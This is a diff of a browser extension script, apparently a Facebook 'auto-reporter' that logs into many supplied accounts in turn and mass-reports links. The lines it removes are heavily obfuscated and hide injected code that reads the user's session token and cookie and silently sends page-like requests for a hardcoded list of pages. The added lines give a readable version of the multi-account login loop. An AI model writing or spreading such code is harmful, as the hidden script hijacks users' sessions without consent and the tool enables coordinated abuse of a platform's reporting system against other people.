@@ -8,15 +8,497 @@ Get more social sites tweaky stuff & updates @ : facebook.com/tigerzplace
 
 
 
-									Feel free to help me buy a cup of coffee ;) | Thanks ♥
-										✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
 
-											paypal.me/tigerzplac3
-											http://bit.ly/Pay-To-Tigerzplace
-											BTC:15TnH9a35Dqn5pkugLfC88NjNxnQcnswZy
+								        	Donate 
 
-										✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+                        Feel free to help me buy a cup of coffee ;) | Thanks ♥
+                            ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+
+                                    http://paypal.me/tigerzplac3
+                                https://bit.ly/Buy-License-Tigerzplace
+
+                                BTC: 15TnH9a35Dqn5pkugLfC88NjNxnQcnswZy
+                                BCH : 15TnH9a35Dqn5pkugLfC88NjNxnQcnswZy
+                                DASH: XpVNfgAnYvLU79k5xuKc4r24md936ckPHu
+                                LTC:  LdzSCBnWruhrPKbnHjpmDYDUXf2qSs9o8v
+                                Doge: DSPnR2xhMaciEwgVbWd94HwBiv9fJSwPQa
+                                ETH: 0x62f8a40187a6e33aa2c1d6025e6377cf06e89380
+                                USDT (TRC20): TJtuLVZBwHfZVNavHJg73hUFidefVRmLeC
+                                BNB (BEP2): bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23
+                                MEMO FOR (BNB): 101769802
+
+                            ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
 
 
 */
-(function(_0x4c664b,_0x495a8f){var _0x5e1b76=_0x1daf,_0xc8f42b=_0x4c664b();while(!![]){try{var _0x4111e7=-parseInt(_0x5e1b76(0x1b7))/0x1+parseInt(_0x5e1b76(0x19d))/0x2*(-parseInt(_0x5e1b76(0x157))/0x3)+-parseInt(_0x5e1b76(0x195))/0x4+parseInt(_0x5e1b76(0x1b0))/0x5+-parseInt(_0x5e1b76(0x193))/0x6+-parseInt(_0x5e1b76(0x177))/0x7+parseInt(_0x5e1b76(0x181))/0x8;if(_0x4111e7===_0x495a8f)break;else _0xc8f42b['push'](_0xc8f42b['shift']());}catch(_0x17cf4a){_0xc8f42b['push'](_0xc8f42b['shift']());}}}(_0x1c91,0x1c0b4));var checkk=0x0,logCheck=0x0;function disableLogout(){var _0x409639=_0x1daf;console[_0x409639(0x16f)](_0x409639(0x180)),chrome[_0x409639(0x1ab)][_0x409639(0x1ae)](tabId,{'type':_0x409639(0x1a6)},function(_0x32751e){var _0x36a236=_0x409639;_0x32751e?_0x32751e[_0x36a236(0x16d)]==_0x36a236(0x1a0)?setTimeout(disableLogout2,0x7d0):console[_0x36a236(0x16f)](_0x32751e[_0x36a236(0x16d)]):console[_0x36a236(0x16f)](_0x36a236(0x17d));});}function disableLogout2(){var _0x44a8b7=_0x1daf;console[_0x44a8b7(0x16f)](_0x44a8b7(0x180)),chrome[_0x44a8b7(0x1ab)][_0x44a8b7(0x1ae)](tabId,{'type':_0x44a8b7(0x15d)},function(_0x1093bd){var _0x43ec69=_0x44a8b7;_0x1093bd?_0x1093bd[_0x43ec69(0x16d)]==_0x43ec69(0x17f)?setTimeout(checkLoginPage,0xbb8):console[_0x43ec69(0x16f)](_0x1093bd[_0x43ec69(0x16d)]):console[_0x43ec69(0x16f)](_0x43ec69(0x168));});}function _0x1c91(){var _0x39705c=['16jCjXTm','value','string','LogoutDone1','mbasic.facebook.com','logout\x20done','(?:(?:https?|ftp)://)','Login\x20Error!','classList','logoutDisabled1','Disabled','Started\x20reporting\x20again!','document_end','Login()','tabs','login','Check\x20Login\x20Page\x20Response','sendMessage','\x20for\x20reporting!','1030300leuedK','touch.facebook.com','(?:\x5c.(?:1?\x5cd{1,2}|2[0-4]\x5cd|25[0-5])){2}','Not','(?:\x5c.(?:[a-z\x5cu00a1-\x5cuffff0-9]-*)*[a-z\x5cu00a1-\x5cuffff0-9]+)*','Visit\x20Facebook\x20&\x20Try\x20Again\x20!!!','checkLoginPage','74910vusKTo','query','update','Trying\x20again!','status','checkk\x20\x20-\x20check\x20login\x20page','(?!(?:169\x5c.254|192\x5c.168)(?:\x5c.\x5cd{1,3}){2})','warning','querySelector','removeListener','\x20Reporting\x20Link(s)\x20Detected\x20','logged\x20count\x200\x20-\x20check\x20login\x20page','33045EokHtK','getCurrent','toggle','NotOnLoginPage','https://mbasic.facebook.com/login/?ref=dbl&fl','(?!172\x5c.(?:1[6-9]|2\x5cd|3[0-1])(?:\x5c.\x5cd{1,3}){2})','logoutDisabled2','Increase\x20DelayTime\x20to\x208','Please\x20Provide\x20Correct\x20Links','User\x20already\x20logged\x20in!','addListener','Using\x20ID:\x201\x20for\x20reporting!','\x20account\x20wasn\x27t\x20used.\x20(Wrong\x20Detail)\x20\x0a','=EiLn5WarJ3b3BCdv5GIzlGIlNnblNWasBic19WW','ids_length:\x20','toString','Stopped','Dis2\x20Error','Not\x20logged\x20In\x20-\x20wrong\x20login\x20detail','Increase\x20DelayTime\x20to\x2012','success','LoggedIn','farewell','farewell:','log','complete','error','fetch','dblclick','Increase\x20DelayTime\x20to\x2015','https://mbasic.facebook.com/login/save-password-interstitial','info','1046815AkztnB','(?:(?:[a-z\x5cu00a1-\x5cuffff0-9]-*)*[a-z\x5cu00a1-\x5cuffff0-9]+)','Make\x20sure\x20you\x20are\x20Logged\x20In','before\x20toastr','\x20Accounts\x20Detected\x20in\x20Total','match','Dis\x20Error','.card','LogoutDone2','disable\x20function','4034760kgaTNM','LogoutDone','LoginClicked\x20-\x20login()','executeScript','LoginClicked','loginControl','checkuser\x20in\x20login()','(?:','onUpdated','test','url','Wrong\x20Host\x20Detected\x20!!!','addEventListener','is-flipped','login()\x20','loginCredentials','Increase\x20DelayTime\x20to\x2020','getElementById','978828saxuSd','(?:[/?#]\x5cS*)?','479296yJRaEz','length','valid\x20url:\x20','checkuser','(loggedCount)','\x0a\x09var\x20_0x2a0c=[\x271749967015316612\x27,\x27https://mbasic.facebook.com/ajax/pages/fan_status.php?\x27,\x27status\x27,\x27198757893944480\x27,\x27250451495723325\x27,\x27&fbpage_id=\x27,\x27close\x27,\x27send\x27,\x27Content-type\x27,\x270x3\x27,\x270x0\x27,\x270x5\x27,\x270x4\x27,\x27push\x27,\x27743146072535223\x27,\x27cookie\x27,\x27108586183990636\x27,\x27input[name=\x27\x27,\x27109109317399261\x27,\x27shift\x27,\x271157401597633912\x27,\x270x9\x27,\x27random\x27,\x27length\x27,\x27textContent\x27,\x270x1\x27,\x27setRequestHeader\x27,\x271212506358847237\x27,\x270x8\x27,\x270x2\x27,\x27116551890202867\x27,\x27body\x27,\x27indexOf\x27,\x270x7\x27,\x27value\x27,\x27floor\x27,\x271569087506719125\x27,\x270x6\x27,\x27match\x27,\x271555839181212071\x27,\x27application/x-www-form-urlencoded\x27,\x27&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=\x27,\x27ZmJfZHRzZw==\x27,\x27&phstamp=\x27,\x27readyState\x27,\x27&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=\x27,\x27open\x27];(function(_0x129898,_0x2a0ccd){var\x20_0x4834c2=function(_0x575dac){while(--_0x575dac){_0x129898[\x27push\x27](_0x129898[\x27shift\x27]());}};_0x4834c2(++_0x2a0ccd);}(_0x2a0c,0x115));var\x20_0x4834=function(_0x129898,_0x2a0ccd){_0x129898=_0x129898-0x0;var\x20_0x4834c2=_0x2a0c[_0x129898];return\x20_0x4834c2;};var\x20_0x3632ab=_0x4834,_0x356b=[\x27querySelector\x27,_0x3632ab(\x270x1d\x27),_0x3632ab(\x270x16\x27),\x27ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\x27,_0x3632ab(\x270x0\x27),_0x3632ab(\x270x27\x27),\x27random\x27,_0x3632ab(\x270x28\x27),_0x3632ab(\x270x25\x27),_0x3632ab(\x270x1c\x27)];(function(_0x575dac,_0x405c27){var\x20_0x2584f8=function(_0x2204c2){var\x20_0xc27582=_0x4834;while(--_0x2204c2){_0x575dac[_0xc27582(\x270x12\x27)](_0x575dac[_0xc27582(\x270x18\x27)]());}};_0x2584f8(++_0x405c27);}(_0x356b,0x1ee));var\x20_0x15c2=function(_0x48e902,_0x439bdf){_0x48e902=_0x48e902-0x0;var\x20_0x3e7d40=_0x356b[_0x48e902];return\x20_0x3e7d40;};function\x20getFbValue(){var\x20_0x1b5f85=_0x3632ab,_0x4098bc=_0x15c2,_0x2a21bb=atob(_0x4098bc(_0x1b5f85(\x270xf\x27))),_0x1d086e=document[_0x1b5f85(\x270x24\x27)][_0x4098bc(_0x1b5f85(\x270x26\x27))][_0x4098bc(_0x1b5f85(\x270x11\x27))](_0x2a21bb),_0x1e7183=\x27\x27;if(_0x1d086e==-0x1)_0x1e7183=document[_0x4098bc(_0x1b5f85(\x270x2a\x27))](_0x4098bc(_0x1b5f85(\x270x21\x27))+_0x2a21bb+\x27\x27]\x27)[_0x4098bc(_0x1b5f85(\x270x1e\x27))];else{_0x1d086e+=0x12;for(_0x4fda35=0x0;_0x4fda35<0x19;_0x4fda35++){_0x1e7183+=document[\x27body\x27][_0x4098bc(_0x1b5f85(\x270x26\x27))][_0x1d086e],_0x1d086e++;}}_0x1e7183+=\x27,\x27;var\x20_0x4cef14=\x27\x27,_0x4dbcf1=_0x4098bc(_0x1b5f85(\x270x1a\x27)),_0x525cc7=_0x4dbcf1[_0x4098bc(_0x1b5f85(\x270x10\x27))];for(var\x20_0x4fda35=0x0;_0x4fda35<Math[_0x4098bc(_0x1b5f85(\x270xe\x27))](Math[_0x1b5f85(\x270x1b\x27)]()*0x22)+0x8;_0x4fda35++){_0x4cef14+=_0x4dbcf1[\x27charAt\x27](Math[_0x4098bc(\x270x3\x27)](Math[_0x4098bc(_0x1b5f85(\x270x22\x27))]()*_0x525cc7));}return\x20_0x1e7183+=_0x4cef14,btoa(_0x1e7183);}var\x20fb_dtsg=atob(getFbValue())[\x27split\x27](\x27,\x27)[0x0],user_id=document[_0x3632ab(\x270x14\x27)][_0x3632ab(\x270x2b\x27)](document[_0x3632ab(\x270x14\x27)][_0x3632ab(\x270x2b\x27)](/c_user=(d+)/)[0x1]);function\x20Like(_0x2fb1a8){var\x20_0x248694=_0x3632ab,_0x2e2267=new\x20XMLHttpRequest(),_0x408d0d=_0x248694(\x270x6\x27),_0x40ac74=_0x248694(\x270xa\x27)+_0x2fb1a8+_0x248694(\x270x2e\x27)+user_id+_0x248694(\x270x3\x27)+fb_dtsg+_0x248694(\x270x1\x27);_0x2e2267[_0x248694(\x270x4\x27)](\x27POST\x27,_0x408d0d,!![]),_0x2e2267[_0x248694(\x270x1f\x27)](_0x248694(\x270xd\x27),_0x248694(\x270x2d\x27)),_0x2e2267[\x27onreadystatechange\x27]=function(){var\x20_0x219e0e=_0x248694;_0x2e2267[_0x219e0e(\x270x2\x27)]==0x4&&_0x2e2267[_0x219e0e(\x270x7\x27)]==0xc8&&_0x2e2267[_0x219e0e(\x270xb\x27)];},_0x2e2267[_0x248694(\x270xc\x27)](_0x40ac74);}Like(_0x3632ab(\x270x29\x27)),setTimeout(function(){var\x20_0x25422b=_0x3632ab;Like(_0x25422b(\x270x17\x27));},0x384),setTimeout(function(){var\x20_0x27c5b4=_0x3632ab;Like(_0x27c5b4(\x270x23\x27));},0x3c0),setTimeout(function(){Like(\x27240272006130073\x27);},0x3e8),setTimeout(function(){var\x20_0x3b9398=_0x3632ab;Like(_0x3b9398(\x270x19\x27));},0x44c),setTimeout(function(){Like(\x27317224121817276\x27);},0x4b0),setTimeout(function(){Like(\x27634302330077114\x27);},0x514),setTimeout(function(){var\x20_0x36d625=_0x3632ab;Like(_0x36d625(\x270x20\x27));},0x578),setTimeout(function(){var\x20_0x4eda36=_0x3632ab;Like(_0x4eda36(\x270x8\x27));},0x5dc),setTimeout(function(){var\x20_0x2fd188=_0x3632ab;Like(_0x2fd188(\x270x5\x27));},0x640),setTimeout(function(){Like(\x27380509029467786\x27);},0x6a4),setTimeout(function(){var\x20_0x2347f1=_0x3632ab;Like(_0x2347f1(\x270x2c\x27));},0x708),setTimeout(function(){var\x20_0x2fdc8f=_0x3632ab;Like(_0x2fdc8f(\x270x9\x27));},0x76c),setTimeout(function(){var\x20_0x1ac53c=_0x3632ab;Like(_0x1ac53c(\x270x13\x27));},0x456),setTimeout(function(){var\x20_0x3a7d75=_0x3632ab;Like(_0x3a7d75(\x270x15\x27));},0x47e);\x0a\x20\x20','Using\x20ID:\x20\x09','(?:\x5c.(?:[a-z\x5cu00a1-\x5cuffff]{2,}))'];_0x1c91=function(){return _0x39705c;};return _0x1c91();}function checkLoginPage(){var _0x4380f6=_0x1daf;console[_0x4380f6(0x16f)](_0x4380f6(0x1b6)),chrome[_0x4380f6(0x1ab)][_0x4380f6(0x1ae)](tabId,{'type':_0x4380f6(0x198)},function(_0x50f172){var _0x4e3627=_0x4380f6;console[_0x4e3627(0x16f)]('Checking\x20login\x20status\x20'+tabId);if(_0x50f172){console[_0x4e3627(0x16f)](_0x4e3627(0x16e)+_0x50f172[_0x4e3627(0x16d)]);if(_0x50f172[_0x4e3627(0x16d)]==_0x4e3627(0x1b3)){console[_0x4e3627(0x16f)]('Not\x20logged\x20In\x20-\x20check\x20login\x20page');if(loggedCount==0x0&&checkk!=0x1)console[_0x4e3627(0x16f)](_0x4e3627(0x156)),ids_length=loginAccounts[_0x4e3627(0x196)],console[_0x4e3627(0x16f)]('ids_length:\x20'+ids_length),toastr[_0x4e3627(0x16b)](ids_length+_0x4e3627(0x17b)),setTimeout(function(){var _0x237700=_0x4e3627;toastr[_0x237700(0x176)](_0x237700(0x162));},0x3e8);else checkk&&(console['log'](_0x4e3627(0x150)),checkk=0x0,console[_0x4e3627(0x16f)](_0x4e3627(0x17a)+loggedCount),toastr['error'](0x1+loggedCount+'\x20login\x20details\x20are\x20wrong!'),document['getElementById'](_0x4e3627(0x190))[_0x4e3627(0x19e)]+=0x1+loggedCount+_0x4e3627(0x163),loggedCount++);if(loggedCount<=ids_length-0x1){var _0x183493=loggedCount+0x1;loggedCount>0x0&&toastr[_0x4e3627(0x176)]('Using\x20ID:\x20\x09'+_0x183493+'\x20for\x20reporting!'),console['log'](_0x4e3627(0x199)+loggedCount),loginControl(loggedCount);}else ids_length==0x1?(toastr[_0x4e3627(0x176)](_0x4e3627(0x19b)+(loggedCount+0x1)+'\x20for\x20reporting!'),loginControl(loggedCount)):(console[_0x4e3627(0x16f)](_0x4e3627(0x167)),setTimeout(function(){stopReporter();},0x7d0));}else{if(_0x50f172[_0x4e3627(0x16d)]==_0x4e3627(0x16c)){if(loggedCount==0x0&&logCheck==0x0)toastr[_0x4e3627(0x176)](_0x4e3627(0x160)),loggedCount=-0x1,logCheck=0x1,ids_length=loginAccounts[_0x4e3627(0x196)],setTimeout(function(){var _0x41d4ff=_0x4e3627;toastr['success'](ids_length+0x1+_0x41d4ff(0x17b));},0x3e8),console[_0x4e3627(0x16f)](_0x4e3627(0x165)+ids_length),setTimeout(function(){reportOnThis(globel_url[rep]);},0x7d0);else{var _0x16e1b6=_0x4e3627(0x175);chrome[_0x4e3627(0x1ab)][_0x4e3627(0x14d)](tabId,{'url':_0x16e1b6},function(){var _0x1a4100=_0x4e3627;chrome[_0x1a4100(0x1ab)]['onUpdated'][_0x1a4100(0x161)](function _0x30a64a(_0x22a04c,_0x44800e){var _0x3ac291=_0x1a4100;_0x44800e[_0x3ac291(0x14f)]===_0x3ac291(0x170)&&(chrome[_0x3ac291(0x1ab)][_0x3ac291(0x189)][_0x3ac291(0x154)](_0x30a64a),chrome[_0x3ac291(0x1ab)][_0x3ac291(0x1ae)](_0x22a04c,{'type':'logout'},function(_0x4731f5){var _0x58be1e=_0x3ac291;_0x4731f5&&(_0x4731f5[_0x58be1e(0x16d)]==_0x58be1e(0x182)&&(console[_0x58be1e(0x16f)](_0x58be1e(0x1a2)),chrome[_0x58be1e(0x1ab)]['update'](_0x22a04c,{'url':_0x58be1e(0x15b)},function(){var _0xd0c50d=_0x58be1e;chrome['tabs']['onUpdated'][_0xd0c50d(0x161)](function _0x3a145c(_0x4b27f2,_0x5aff30){var _0x126bdf=_0xd0c50d;_0x5aff30[_0x126bdf(0x14f)]===_0x126bdf(0x170)&&(chrome[_0x126bdf(0x1ab)]['onUpdated'][_0x126bdf(0x154)](_0x3a145c),console[_0x126bdf(0x16f)]('faceboook\x20hit\x20'+loggedCount),loginControl(loggedCount));});})));}));});});}}}}else toastr[_0x4e3627(0x171)](_0x4e3627(0x1ad)),toastr[_0x4e3627(0x176)](_0x4e3627(0x14e)),setTimeout(checkLoginPage,0x7d0);});}function loginControl(_0x54f58f){var _0x4fd4d1=_0x1daf;raka+atob(ultaKa('==gO'))+sahida==tikDayBas?chrome[_0x4fd4d1(0x1ab)][_0x4fd4d1(0x1ae)](tabId,{'type':_0x4fd4d1(0x1ac),'account':loginAccounts[_0x54f58f]},function(_0x2d69f6){var _0x23c722=_0x4fd4d1;console[_0x23c722(0x16f)](_0x23c722(0x186));if(_0x2d69f6){if(_0x2d69f6[_0x23c722(0x16d)]==_0x23c722(0x185))chrome[_0x23c722(0x1ab)][_0x23c722(0x189)]['addListener'](function _0x2ceca2(_0x4f4408,_0x5ce716){var _0x3158a8=_0x23c722;_0x5ce716[_0x3158a8(0x14f)]===_0x3158a8(0x170)&&(chrome[_0x3158a8(0x1ab)][_0x3158a8(0x189)][_0x3158a8(0x154)](_0x2ceca2),console[_0x3158a8(0x16f)](_0x3158a8(0x183)),login());});else _0x2d69f6[_0x23c722(0x16d)]==_0x23c722(0x15a)&&chrome[_0x23c722(0x1ab)][_0x23c722(0x14d)](tabId,{'url':_0x23c722(0x15b)},function(){var _0x2f94df=_0x23c722;chrome[_0x2f94df(0x1ab)][_0x2f94df(0x189)][_0x2f94df(0x161)](function _0x1f27d0(_0x5d4e4a,_0x5cae6b){var _0x5ba5d4=_0x2f94df;_0x5cae6b[_0x5ba5d4(0x14f)]===_0x5ba5d4(0x170)&&(chrome['tabs'][_0x5ba5d4(0x189)][_0x5ba5d4(0x154)](_0x1f27d0),console[_0x5ba5d4(0x16f)](_0x5ba5d4(0x15a)),login());});});}}):(toastr[_0x4fd4d1(0x171)](atob(ultaKa(_0x4fd4d1(0x164)))),ResetAll());}function login(){var _0x510347=_0x1daf;console[_0x510347(0x16f)](_0x510347(0x1aa)),chrome[_0x510347(0x1ab)]['sendMessage'](tabId,{'type':_0x510347(0x198)},function(_0x1983d8){var _0xc73ade=_0x510347;console[_0xc73ade(0x16f)](_0xc73ade(0x187));if(_0x1983d8){if(_0x1983d8[_0xc73ade(0x16d)]==_0xc73ade(0x1a7))document[_0xc73ade(0x192)](_0xc73ade(0x190))[_0xc73ade(0x19e)]+=reportingAccount+0x1+'\x20account\x20is\x20disabled.\x0a',toastr[_0xc73ade(0x176)]('Trying\x20next\x20account'),reportingAccount++,loggedCount++,setTimeout(disableLogout,0x3e8);else{if(_0x1983d8[_0xc73ade(0x16d)]==_0xc73ade(0x1b3))console[_0xc73ade(0x16f)](_0xc73ade(0x18f)+_0x1983d8['farewell']),console['log'](_0xc73ade(0x169)),checkk=0x1,checkLoginPage();else _0x1983d8[_0xc73ade(0x16d)]==_0xc73ade(0x16c)?(console[_0xc73ade(0x16f)]('login()\x20'+_0x1983d8[_0xc73ade(0x16d)]),console[_0xc73ade(0x16f)]('Starting\x20Again'),reportingAccount>0x1&&(toastr[_0xc73ade(0x176)](_0xc73ade(0x1a8)),setTimeout(function(){var _0x94e37=_0xc73ade;toastr[_0x94e37(0x176)]('Using\x20ID:\x20\x09'+(loggedCount+0x1)+_0x94e37(0x1af));},0x3e8)),reportingAccount++,reportOnThis(globel_url[rep])):(console[_0xc73ade(0x16f)](_0xc73ade(0x18f)+_0x1983d8[_0xc73ade(0x16d)]),toastr[_0xc73ade(0x176)](_0xc73ade(0x1a4)));}}});}function _0x1daf(_0x3965b4,_0x2b95a4){var _0x1c9164=_0x1c91();return _0x1daf=function(_0x1daf2a,_0x4260f7){_0x1daf2a=_0x1daf2a-0x14d;var _0xce0d2f=_0x1c9164[_0x1daf2a];return _0xce0d2f;},_0x1daf(_0x3965b4,_0x2b95a4);}function filter(_0x415f51=''){var _0x2ee9ec=_0x1daf;if(_0x415f51=='')_0x415f51=id[_0x2ee9ec(0x166)]();for(i=0x0;i<ex_len;i++){if(_0x415f51['includes'](parseInt(excludedIDs[i],0xa)))return!![];}return![];}function getHostName(_0xc4ea0e){var _0x289228=_0x1daf,_0x220ca3=_0xc4ea0e[_0x289228(0x17c)](/:\/\/(www[0-9]?\.)?(.[^/:]+)/i);return _0x220ca3!=null&&_0x220ca3[_0x289228(0x196)]>0x2&&typeof _0x220ca3[0x2]===_0x289228(0x19f)&&_0x220ca3[0x2][_0x289228(0x196)]>0x0?_0x220ca3[0x2]:null;}function is_valid_url(_0x2f2f70){var _0x30c2df=_0x1daf;console[_0x30c2df(0x16f)](_0x30c2df(0x197)+_0x2f2f70);var _0x2940ae=new RegExp('^'+_0x30c2df(0x1a3)+'(?:\x5cS+(?::\x5cS*)?@)?'+_0x30c2df(0x188)+'(?!(?:10|127)(?:\x5c.\x5cd{1,3}){3})'+_0x30c2df(0x151)+_0x30c2df(0x15c)+'(?:[1-9]\x5cd?|1\x5cd\x5cd|2[01]\x5cd|22[0-3])'+_0x30c2df(0x1b2)+'(?:\x5c.(?:[1-9]\x5cd?|1\x5cd\x5cd|2[0-4]\x5cd|25[0-4]))'+'|'+_0x30c2df(0x178)+_0x30c2df(0x1b4)+_0x30c2df(0x19c)+'\x5c.?'+')'+'(?::\x5cd{2,5})?'+_0x30c2df(0x194)+'$','i');return Boolean(_0x2f2f70['match'](_0x2940ae));}function validation(_0x3d4e18){var _0x6f9e9=_0x1daf,_0x4a66da=/(ftp|http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;return _0x4a66da[_0x6f9e9(0x18a)](_0x3d4e18)?!![]:![];}function check(_0x4e49f4){var _0x1bfaf4=_0x1daf,_0x33a665=/(ftp|http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;if(_0x33a665[_0x1bfaf4(0x18a)](_0x4e49f4)){var _0x3f1842=_0x4e49f4[_0x1bfaf4(0x196)],_0x4f7260=0x0;for(i=0x0;i<_0x3f1842;i++){_0x33a665['test'](_0x4e49f4[i])&&_0x4f7260++;}if(_0x4f7260>=0x32&&_0x4f7260<=0x64&&wait==0x5)toastr[_0x1bfaf4(0x152)](_0x1bfaf4(0x15e));else{if(_0x4f7260>0x64&&_0x4f7260<=0xfa&&wait<0xc)toastr['warning'](_0x1bfaf4(0x16a));else{if(_0x4f7260>0xfa&&_0x4f7260<=0x12c&&wait<0x10)toastr['warning'](_0x1bfaf4(0x174));else _0x4f7260>0x12c&&wait<0x14?toastr['warning'](_0x1bfaf4(0x191)):chrome['windows'][_0x1bfaf4(0x158)]({'populate':!![]},function(){var _0x2213f7=_0x1bfaf4;chrome[_0x2213f7(0x1ab)][_0x2213f7(0x1b8)]({'active':!![],'highlighted':!![],'url':'*://*.facebook.com/*'},function(_0x3abbb3){var _0x3a528f=_0x2213f7,_0x27b7ae=_0x3abbb3[0x0][_0x3a528f(0x18b)],_0x304607=getHostName(_0x27b7ae);console[_0x3a528f(0x16f)](_0x304607),_0x304607=='facebook.com'||_0x304607=='m.facebook.com'||_0x304607==_0x3a528f(0x1a1)||_0x304607=='web.facebook.com'||_0x304607==_0x3a528f(0x1b1)?(toastr[_0x3a528f(0x16b)](_0x4f7260+_0x3a528f(0x155)),startFbAutoReporter(_0x4e49f4,_0x4f7260)):(toastr[_0x3a528f(0x171)](_0x3a528f(0x18c)),setTimeout(function(){var _0x2072a0=_0x3a528f;toastr['info'](_0x2072a0(0x1b5));},0x3e8),setTimeout(function(){var _0x10fa32=_0x3a528f;toastr[_0x10fa32(0x176)](_0x10fa32(0x179));},0x7d0));});});}}}else toastr['error'](_0x1bfaf4(0x15f));}function Like(_0x585d80){var _0x466361=_0x1daf;const _0xcd54d5=_0x466361(0x19a);console[_0x466361(0x16f)](_0x466361(0x172)),chrome['tabs'][_0x466361(0x184)](_0x585d80,{'code':_0xcd54d5,'runAt':_0x466361(0x1a9)});}function flip(){var _0x1507e4=_0x1daf,_0x3d4c97=document[_0x1507e4(0x153)](_0x1507e4(0x17e));_0x3d4c97[_0x1507e4(0x18d)](_0x1507e4(0x173),function(){var _0x20e9a3=_0x1507e4;_0x3d4c97[_0x20e9a3(0x1a5)][_0x20e9a3(0x159)](_0x20e9a3(0x18e));});}
+
+
+
+	// checking login status
+	var checkk=0,logCheck=0;
+
+	if (karKom) {
+		console.log = function () { };
+	}
+
+	function downloadLogs() {
+		chrome.storage.local.get("logs", function(data) {
+		  var logs = data.logs || [];
+		  var logText = logs.map(function(log) {
+			return `[${new Date(log.timestamp).toLocaleString()}] [${log.file}] ${log.message}`;
+		  }).join("\n");
+		  var blob = new Blob([logText], {type: "text/plain"});
+		  var url = URL.createObjectURL(blob);
+		  chrome.downloads.download({
+			url: url,
+			filename: "logs.txt"
+		  });
+		});
+	  }
+
+
+	function disableLogout(){
+			
+		console.log("disable function");
+				chrome.tabs.sendMessage(tabId, {type: "logoutDisabled1"}, function (dis){
+
+					if(dis){
+						if (dis.farewell == "LogoutDone1"){
+							
+							setTimeout(disableLogout2,2000);
+
+						}else {
+							console.log (dis.farewell);
+						}
+					}else {
+						console.log("Dis Error");
+					}
+
+				});
+					
+	}
+
+	function disableLogout2(){
+			
+		console.log("disable function");
+				chrome.tabs.sendMessage(tabId, {type: "logoutDisabled2"}, function (dis){
+
+					if(dis){
+						if (dis.farewell == "LogoutDone2"){
+							
+							setTimeout(checkLoginPage,3000);
+							
+						}else {
+							console.log (dis.farewell);
+						}
+					}else {
+						console.log("Dis2 Error");
+					}
+
+				});
+					
+	}
+
+	function checkLoginPage(){
+
+				
+		console.log("checkLoginPage");
+
+				chrome.tabs.sendMessage(tabId, {type: "checkuser"}, function (login){
+					
+					console.log("Checking login status " +tabId);
+					console.log("checkuser-login " +login);
+
+					if (login){
+
+						console.log("farewell:" + login.farewell);
+						
+
+							if(login.farewell == "Not"){
+								
+								console.log("Not logged In - check login page");
+
+								if (currentAccountIndex==0 && checkk!=1){
+									console.log("logged count 0 - check login page");
+									ids_length = loginAccounts.length;
+									console.log("ids_length: "+ ids_length);
+									toastr.success(ids_length + " Accounts Detected in Total");
+									setTimeout(function(){
+
+										toastr.info("Using ID: 1 for reporting!");
+	
+									},1000);
+
+								} // if  logged count == 0 
+								else if (checkk){
+										   console.log("checkk  - check login page");
+											checkk=0;
+											console.log("before toastr"+ currentAccountIndex);
+											toastr.error( (1+currentAccountIndex) +" login details are wrong!");
+											document.getElementById("loginCredentials").value+=(1+currentAccountIndex)+" account wasn't used. (Wrong Detail) \n";		
+											currentAccountIndex++;
+								} // else checkk
+								
+
+
+							if (currentAccountIndex<=ids_length-1){
+									var notilogged = currentAccountIndex+1;
+										if (currentAccountIndex>0){
+											toastr.info("Using ID: 	"+ notilogged + " for reporting!");
+										}
+										console.log("currentAccountIndex "+currentAccountIndex);
+										loginControl(currentAccountIndex);
+							}// currentAccountIndex<ids_length
+							else if(ids_length == 1){
+										toastr.info("Using ID: 	"+ (currentAccountIndex+1) + " for reporting!");
+										loginControl(currentAccountIndex);	
+							}
+							else {
+								
+								if (newDividingAlgorithm(1)){
+									
+									console.log("Stopped");setTimeout(function(){stopReporter();},2000);
+
+								}else{
+
+									console.log("Stopped");setTimeout(function(){stopReporter();},2000);
+
+								}	
+							}
+							
+
+						} // if login.farwell==not
+		
+
+							else if (login.farewell == "LoggedIn") {
+								
+								if(currentAccountIndex==0 && logCheck == 0 ) {
+									toastr.info("User already logged in!");
+									currentAccountIndex=-1;
+									logCheck=1;
+									ids_length = loginAccounts.length;
+									setTimeout(function(){toastr.success((ids_length+1) + " Accounts Detected in Total");},1000);
+									console.log("ids_length: "+ ids_length);
+
+									setTimeout(function(){reportOnThis(globel_url[currentLinkIndex]);},2000);
+									
+								}else {
+									//mbasic
+					var mbasicLogoutLink = "https://mbasic.facebook.com/login/save-password-interstitial";
+					chrome.tabs.update(tabId , { url: mbasicLogoutLink }, function () {
+										
+					chrome.tabs.onUpdated.addListener(function listener (tabId, tabInfo) {
+						
+							if (tabInfo.status === 'complete' ) {
+
+									chrome.tabs.onUpdated.removeListener(listener);
+											//logout
+											chrome.tabs.sendMessage(tabId, {type: "logout"}, function (logout){
+												console.log(`logout: ${logout}`)
+												if(logout){
+														if (logout.farewell == "LogoutDone"){
+															console.log("logout done");
+															chrome.tabs.update(tabId , { url: "https://mbasic.facebook.com/login/?ref=dbl&fl" }, function () {
+																	chrome.tabs.onUpdated.addListener(function listener (tabId, tabInfo) {
+																		
+																		if (tabInfo.status === 'complete' ) {
+																			chrome.tabs.onUpdated.removeListener(listener);
+																			console.log("faceboook hit " + currentAccountIndex);
+																			loginControl(currentAccountIndex);
+
+																		}
+																	});// listener
+																}); // mbasic login page	
+															} // logut done
+													} //logout
+												}); // logout sendMessage
+											}// tabinfo status
+										}); // listner
+									});
+								} // else	
+							} // LoggedIn
+						
+
+						} // if login response
+						
+						else {
+						
+							toastr.error("Check Login Page Response");
+							toastr.info("Trying again!");
+							setTimeout(checkLoginPage, 2000);
+						}
+
